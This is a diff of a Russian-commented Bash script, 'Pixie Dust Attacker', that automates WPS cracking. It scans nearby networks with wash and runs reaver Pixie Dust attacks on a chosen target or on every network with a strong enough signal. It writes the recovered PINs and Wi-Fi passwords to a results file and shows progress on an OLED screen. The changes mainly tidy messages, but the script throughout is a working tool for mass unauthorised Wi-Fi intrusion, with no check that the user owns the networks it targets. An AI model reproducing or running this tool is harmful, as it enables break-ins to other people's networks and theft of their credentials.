@@ -2,8 +2,7 @@
 
 # ============================================
 # PIXIE DUST ATTACKER - Offline WPS Crack Tool
-# Версия: 3.0 | Только Pixie Dust, одна попытка
-# Поддержка интерактивного и неинтерактивного режима
+# Версия: 3.0 | Красивый OLED вывод
 # ============================================
 
 RED='\033[0;31m'
@@ -16,26 +15,22 @@ WHITE='\033[1;37m'
 NC='\033[0m'
 
 # ============================================
-# НАСТРОЙКИ (ИЗМЕНИТЕ ПОД СЕБЯ)
+# НАСТРОЙКИ
 # ============================================
-INTERFACE="wlan0"           # Ваш Wi-Fi интерфейс
-CAPTURE_TIME=30             # Время на атаку в секундах
-OUTPUT_DIR="pixie_results"  # Директория для результатов
-OLED_SCRIPT="/root/oled_display.py"  # Путь к скрипту OLED
+INTERFACE="wlan0"
+CAPTURE_TIME=30
+OUTPUT_DIR="pixie_results"
+OLED_SCRIPT="/root/oled_display.py"
 FIFO_PATH="/tmp/oled_fifo"
-AUTO_TIMEOUT=15             # Секунд до автоматического выбора режима G
+AUTO_TIMEOUT=15
 # ============================================
 
-# ============================================
-# ОПРЕДЕЛЕНИЕ ИНТЕРАКТИВНОГО РЕЖИМА
-# ============================================
+# Определение интерактивного режима
 if [ ! -t 0 ]; then
     NON_INTERACTIVE=1
-    FORCE_MODE="G"
 else
     NON_INTERACTIVE=0
 fi
-# ============================================
 
 MONITOR_INTERFACE=""
 TEMP_FILE=""
@@ -51,7 +46,6 @@ print_header() {
     echo -e "${CYAN}╔════════════════════════════════════════════════════════════════╗${NC}"
     echo -e "${CYAN}║${WHITE}              PIXIE DUST ATTACKER - Offline WPS Crack           ${CYAN}║${NC}"
     echo -e "${CYAN}║${YELLOW}       Только Pixie Dust | 1 попытка на сеть                     ${CYAN}║${NC}"
-    echo -e "${CYAN}║${GREEN}       Автовыбор режима G через ${AUTO_TIMEOUT} сек                       ${CYAN}║${NC}"
     echo -e "${CYAN}╚════════════════════════════════════════════════════════════════╝${NC}"
     echo ""
 }
@@ -64,7 +58,7 @@ print_step() { echo -e "${MAGENTA}[→]${NC} $1" | tee -a "$LOG_FILE"; }
 print_separator() { echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"; }
 
 # ============================================
-# ФУНКЦИИ OLED
+# ФУНКЦИИ OLED (красивый вывод)
 # ============================================
 
 oled_send() {
@@ -78,6 +72,13 @@ oled_line2() { oled_send "L2:$1"; }
 oled_line3() { oled_send "L3:$1"; }
 oled_line4() { oled_send "L4:$1"; }
 
+oled_status_scan() { oled_line1 "◈ SCANNING ◈"; }
+oled_status_attack() { oled_line1 "▶ ATTACK ◀"; }
+oled_status_success() { oled_line1 "★ SUCCESS ★"; }
+oled_status_fail() { oled_line1 "◆ FAILED ◆"; }
+oled_status_wait() { oled_line1 "◈ WAITING ◈"; }
+oled_status_complete() { oled_line1 "✓ COMPLETE ✓"; }
+
 start_oled() {
     if [ -f "$OLED_SCRIPT" ]; then
         print_step "Запуск OLED дисплея..."
@@ -88,18 +89,18 @@ start_oled() {
         if [ -p "$FIFO_PATH" ]; then
             print_success "OLED дисплей запущен"
         else
-            print_warning "OLED не отвечает, продолжаем без дисплея"
+            print_warning "OLED не отвечает"
             OLED_PID=""
         fi
-    else
-        print_warning "OLED скрипт не найден: $OLED_SCRIPT"
     fi
 }
 
 stop_oled() {
     if [ -n "$OLED_PID" ] && kill -0 $OLED_PID 2>/dev/null; then
-        oled_line1 "Script ended"
-        oled_line2 "Goodbye!"
+        oled_line1 "Goodbye!"
+        oled_line2 ""
+        oled_line3 ""
+        oled_line4 ""
         sleep 1
         kill $OLED_PID 2>/dev/null
     fi
@@ -113,36 +114,24 @@ stop_oled() {
 check_dependencies() {
     print_step "Проверка установленных программ..."
     
-    local missing=()
-    
     if ! command -v reaver &> /dev/null; then
         print_error "reaver не установлен!"
-        missing+=("reaver")
+        exit 1
+    fi
+    
+    if ! reaver -h 2>&1 | grep -q "pixie-dust"; then
+        print_warning "Стандартный Reaver! Нужна модифицированная версия"
     else
-        if reaver -h 2>&1 | grep -q "pixie-dust"; then
-            print_success "Reaver с поддержкой Pixie Dust"
-        else
-            print_warning "Стандартный Reaver! Нужна модифицированная версия"
-        fi
+        print_success "Reaver с поддержкой Pixie Dust"
     fi
     
     if ! command -v airmon-ng &> /dev/null; then
         print_error "airmon-ng не установлен!"
-        missing+=("aircrack-ng")
-    else
-        print_success "airmon-ng установлен"
+        exit 1
     fi
     
     if ! command -v wash &> /dev/null; then
         print_error "wash не установлен!"
-        missing+=("wash")
-    else
-        print_success "wash установлен"
-    fi
-    
-    if [ ${#missing[@]} -ne 0 ]; then
-        print_error "Отсутствуют зависимости: ${missing[*]}"
-        echo "Установка: sudo apt install reaver aircrack-ng -y"
         exit 1
     fi
     
@@ -192,9 +181,11 @@ is_already_cracked() {
 # ============================================
 
 find_wps_networks() {
-    print_step "Поиск WPS сетей с незаблокированным WPS (Locked=No)..."
-    oled_line1 "Scanning WPS..."
-    oled_line2 "Please wait 25s"
+    print_step "Поиск WPS сетей..."
+    oled_status_scan
+    oled_line2 "Scanning WPS..."
+    oled_line3 "Please wait..."
+    oled_line4 "25 seconds"
     
     TEMP_FILE="/tmp/wps_targets.txt"
     > "$TEMP_FILE"
@@ -223,19 +214,20 @@ find_wps_networks() {
     
     if [ ! -s "$TEMP_FILE" ]; then
         print_error "Не найдено ни одной сети с Locked=No"
-        oled_line1 "No WPS networks"
+        oled_line2 "No WPS networks"
+        oled_line3 "Found: 0"
         return 1
     fi
     
     local cnt=$(wc -l < "$TEMP_FILE")
     print_success "Найдено $cnt сетей"
-    oled_line1 "Ready! $cnt targets"
-    oled_line2 ""
+    oled_line2 "Found: $cnt targets"
+    oled_line3 ""
     return 0
 }
 
 # ============================================
-# ВЫБОР ЦЕЛИ (с автотаймаутом и поддержкой non-interactive)
+# ВЫБОР ЦЕЛИ
 # ============================================
 
 select_target() {
@@ -245,12 +237,10 @@ select_target() {
     print_separator
     echo ""
     
-    # Неинтерактивный режим
     if [ $NON_INTERACTIVE -eq 1 ]; then
         AUTO_MODE=1
         SELECTED_MODE="good"
-        print_info "Неинтерактивный режим: выбран режим G (только хороший сигнал)"
-        oled_line1 "Mode: Good signal (auto)"
+        print_info "Неинтерактивный режим: режим G"
         return 0
     fi
     
@@ -271,7 +261,7 @@ select_target() {
     local max_choice=$((i-1))
     
     echo ""
-    echo -e "  ${GREEN}[A]${NC} - Все сети | ${GREEN}[G]${NC} - Только хороший сигнал | ${GREEN}[0]${NC} - Выход"
+    echo -e "  ${GREEN}[A]${NC} - Все сети | ${GREEN}[G]${NC} - Хороший сигнал | ${GREEN}[0]${NC} - Выход"
     echo -e "  ${YELLOW}Автовыбор G через ${AUTO_TIMEOUT} сек...${NC}"
     echo ""
     
@@ -285,23 +275,20 @@ select_target() {
     echo "" >&2
     
     if [ -z "$choice" ]; then
-        echo ""; print_warning "Таймаут! Выбран режим G (хороший сигнал)"
+        echo ""; print_warning "Таймаут! Режим G"
         AUTO_MODE=1; SELECTED_MODE="good"
-        oled_line1 "Mode: Good signal"
         return 0
     fi
     
     case "$choice" in
         0) return 1 ;;
-        [aA]) AUTO_MODE=1; SELECTED_MODE="all"; print_info "Режим: все сети"; return 0 ;;
-        [gG]) AUTO_MODE=1; SELECTED_MODE="good"; print_info "Режим: хороший сигнал"; return 0 ;;
+        [aA]) AUTO_MODE=1; SELECTED_MODE="all"; return 0 ;;
+        [gG]) AUTO_MODE=1; SELECTED_MODE="good"; return 0 ;;
         *)
             if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "$max_choice" ]; then
                 SELECTED_BSSID="${bssids[$choice]}"
                 SELECTED_ESSID="${essids[$choice]}"
                 AUTO_MODE=0
-                print_info "Выбрана сеть #$choice: $SELECTED_ESSID"
-                oled_line1 "Target: $SELECTED_ESSID"
                 return 0
             else
                 print_error "Неверный выбор"
@@ -313,7 +300,7 @@ select_target() {
 }
 
 # ============================================
-# PIXIE DUST АТАКА (одна попытка)
+# PIXIE DUST АТАКА
 # ============================================
 
 pixie_attack() {
@@ -322,12 +309,12 @@ pixie_attack() {
     local current=$3
     local total=$4
     
-    # Проверка на уже взломанную
     if is_already_cracked "$bssid"; then
-        print_warning "Сеть $essid уже взломана! Пропускаем."
+        print_warning "Сеть $essid уже взломана!"
         oled_line1 "[$current/$total] SKIPPED"
         oled_line2 "$essid"
         oled_line3 "Already cracked"
+        oled_line4 ""
         sleep 2
         return 2
     fi
@@ -340,12 +327,12 @@ pixie_attack() {
     echo -e "  ${GREEN}ESSID:${NC} $essid"
     echo ""
     
+    oled_status_attack
     if [ "$total" -gt 1 ]; then
-        oled_line1 "[$current/$total] Cracking..."
+        oled_line2 "$essid | #$current/$total"
     else
-        oled_line1 "Cracking..."
+        oled_line2 "$essid"
     fi
-    oled_line2 "$essid"
     oled_line3 "Pixie Dust..."
     oled_line4 ""
     
@@ -362,7 +349,6 @@ pixie_attack() {
     
     disable_monitor_mode
     
-    # Проверка результата
     if grep -qi "PIN found" "$output_file" 2>/dev/null; then
         local pin=$(grep -i "PIN found" "$output_file" | head -1 | awk '{print $NF}')
         local password=""
@@ -375,7 +361,6 @@ pixie_attack() {
         [ -n "$pin" ] && echo -e "  ${GREEN}PIN:${NC} $pin"
         [ -n "$password" ] && echo -e "  ${GREEN}ПАРОЛЬ:${NC} $password"
         
-        # Сохраняем результат
         if [ -n "$pin" ] || [ -n "$password" ]; then
             echo "$(date) | $bssid | $essid | PIN: ${pin:-N/A} | PASS: ${password:-N/A}" >> "$OUTPUT_DIR/cracked_passwords.txt"
             echo "BSSID: $bssid" > "$OUTPUT_DIR/$(echo $bssid | tr ':' '_').txt"
@@ -385,11 +370,11 @@ pixie_attack() {
             echo "Date: $(date)" >> "$OUTPUT_DIR/$(echo $bssid | tr ':' '_').txt"
         fi
         
-        # Обновляем OLED
+        oled_status_success
         if [ "$total" -gt 1 ]; then
-            oled_line1 "[$current/$total] CRACKED!"
+            oled_line2 "$essid | #$current/$total"
         else
-            oled_line1 "CRACKED!"
+            oled_line2 "$essid"
         fi
         [ -n "$pin" ] && oled_line3 "PIN: $pin"
         [ -n "$password" ] && oled_line4 "PASS: ${password:0:18}"
@@ -397,27 +382,28 @@ pixie_attack() {
         return 0
     fi
     
-    # Не уязвим
     print_error "Роутер не уязвим к Pixie Dust"
+    oled_status_fail
     if [ "$total" -gt 1 ]; then
-        oled_line1 "[$current/$total] FAILED"
+        oled_line2 "$essid | #$current/$total"
     else
-        oled_line1 "FAILED"
+        oled_line2 "$essid"
     fi
     oled_line3 "Not vulnerable"
+    oled_line4 ""
     sleep 2
     return 1
 }
 
 # ============================================
-# ОЧИСТКА ПРИ ВЫХОДЕ
+# ОЧИСТКА
 # ============================================
 
 cleanup() {
     echo ""
-    print_warning "Прерывание работы..."
+    print_warning "Прерывание..."
     stop_oled
-    rm -f /tmp/wps_targets.txt /tmp/wps_targets.txt.sorted /tmp/reaver_*.txt 2>/dev/null
+    rm -f /tmp/wps_targets.txt /tmp/reaver_*.txt 2>/dev/null
     exit 0
 }
 
@@ -426,90 +412,56 @@ cleanup() {
 # ============================================
 
 main() {
-    # Парсинг аргументов командной строки
     while [[ $# -gt 0 ]]; do
         case $1 in
-            -i|--interface)
-                INTERFACE="$2"
-                shift 2
-                ;;
-            -t|--timeout)
-                CAPTURE_TIME="$2"
-                shift 2
-                ;;
-            -o|--output)
-                OUTPUT_DIR="$2"
-                shift 2
-                ;;
+            -i|--interface) INTERFACE="$2"; shift 2 ;;
+            -t|--timeout) CAPTURE_TIME="$2"; shift 2 ;;
+            -o|--output) OUTPUT_DIR="$2"; shift 2 ;;
             -h|--help)
                 echo "Использование: sudo ./pixie_attacker.sh [ОПЦИИ]"
-                echo ""
-                echo "ОПЦИИ:"
-                echo "  -i, --interface <iface>    Wi-Fi интерфейс (по умолчанию: wlan0)"
-                echo "  -t, --timeout <сек>        Время на атаку (по умолчанию: 30)"
-                echo "  -o, --output <дир>         Директория для результатов (по умолчанию: pixie_results)"
-                echo "  -h, --help                 Показать справку"
-                echo ""
-                echo "Примеры:"
-                echo "  sudo ./pixie_attacker.sh"
-                echo "  sudo ./pixie_attacker.sh -i wlan1"
-                echo "  sudo ./pixie_attacker.sh -t 45 -o my_results"
+                echo "  -i <iface>  Wi-Fi интерфейс"
+                echo "  -t <сек>    Таймаут атаки"
+                echo "  -o <дир>    Директория для результатов"
                 exit 0
                 ;;
-            *)
-                print_error "Неизвестная опция: $1"
-                exit 1
-                ;;
+            *) print_error "Неизвестная опция: $1"; exit 1 ;;
         esac
     done
     
-    # Проверка прав root
     if [ "$EUID" -ne 0 ]; then
-        print_error "Скрипт должен запускаться с правами root"
-        echo "Используйте: sudo $0"
+        print_error "Запустите с sudo"
         exit 1
     fi
     
-    # Установка обработчиков сигналов
     trap cleanup SIGINT SIGTERM
-    
-    # Заголовок
     print_header
-    
-    # Запуск OLED
     start_oled
-    
-    # Проверка зависимостей
     check_dependencies
     
-    # Поиск сетей
     if ! find_wps_networks; then
         stop_oled
         exit 1
     fi
     
-    # Выбор цели
     if ! select_target; then
         print_info "Выход"
         stop_oled
         exit 0
     fi
     
-    # Атака
     if [ $AUTO_MODE -eq 1 ]; then
         local success_count=0
         local skipped_count=0
         local total=0
         declare -a targets_list
         
-        # Сортируем по сигналу (от лучшего к худшему)
         sort -t'|' -k3 -n "$TEMP_FILE" > "${TEMP_FILE}.sorted"
         
         while IFS='|' read -r bssid channel rssi essid; do
             if [ "$SELECTED_MODE" == "good" ]; then
                 sig_num=$(echo "$rssi" | sed 's/-//g')
                 if [ $sig_num -gt 65 ]; then
-                    print_warning "Пропускаем $bssid (слабый сигнал $rssi)"
+                    print_warning "Пропускаем (слабый сигнал $rssi)"
                     continue
                 fi
             fi
@@ -550,27 +502,29 @@ main() {
         
         echo ""
         print_separator
-        print_success "Успешно взломано: $success_count из $total (пропущено уже взломанных: $skipped_count)"
-        oled_line1 "COMPLETE!"
+        print_success "Успешно взломано: $success_count из $total (пропущено: $skipped_count)"
+        
+        oled_status_complete
         oled_line2 "Cracked: $success_count/$total"
-        oled_line3 "Passwords saved"
+        if [ $success_count -gt 0 ]; then
+            oled_line3 "Passwords saved"
+        else
+            oled_line3 "No passwords found"
+        fi
+        oled_line4 ""
         sleep 3
         
     else
-        # Атака выбранной сети
         pixie_attack "$SELECTED_BSSID" "$SELECTED_ESSID" "1" "1"
     fi
     
-    # Очистка
     stop_oled
     rm -f /tmp/wps_targets.txt /tmp/wps_targets.txt.sorted /tmp/reaver_*.txt 2>/dev/null
     
     echo ""
     print_separator
     print_success "Работа скрипта завершена"
-    print_success "Результаты сохранены в: $OUTPUT_DIR"
     echo ""
 }
 
-# Запуск
 main "$@"
